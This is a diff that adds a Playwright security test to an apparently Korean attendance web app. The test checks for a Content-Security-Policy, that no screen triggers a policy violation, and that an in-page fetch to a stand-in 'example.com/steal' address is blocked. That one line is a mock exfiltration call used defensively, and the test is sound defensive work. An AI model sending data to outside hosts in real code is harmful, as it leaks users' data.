@@ -525,3 +525,19 @@ test('보고 탭: 이번 분기 요약 4개·주별 추이·목장별 출석률�
   await expect(page.locator('#qLabel')).toHaveText('2026년 3분기');
   await expect(page.locator('.rchart circle')).toHaveCount(1);
 });
+
+/* ---------- 보안 ---------- */
+test('보안 정책(CSP)이 있고, 앱의 모든 화면이 정책 위반 없이 동작한다', async ({ page }) => {
+  const violations = [];
+  await page.addInitScript(() => { document.addEventListener('securitypolicyviolation', (e) => { (window.__csp = window.__csp || []).push(e.violatedDirective + ' ' + e.blockedURI); }); });
+  await seed(page, { members: FAKE_MEMBERS, contacts: FAKE_CONTACTS });
+  expect(await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')).toContain("object-src 'none'");
+  await login(page, NF_PW);
+  for (const h of ['#dashboard', '#welcome', '#report', '#check']) { await page.goto('/' + h); await page.waitForTimeout(150); }
+  await page.fill('#date', await page.inputValue('#date'));
+  violations.push(...((await page.evaluate(() => window.__csp)) || []).filter(v => !v.includes('fonts.g')));   // 테스트 환경은 글꼴 서버 접속이 막혀 있어 제외
+  expect(violations).toEqual([]);
+  // 바깥 주소로 데이터를 보내는 시도는 막힌다
+  const blocked = await page.evaluate(async () => { try { await fetch('https://example.com/steal'); return 'sent'; } catch (e) { return 'blocked'; } });
+  expect(blocked).toBe('blocked');
+});
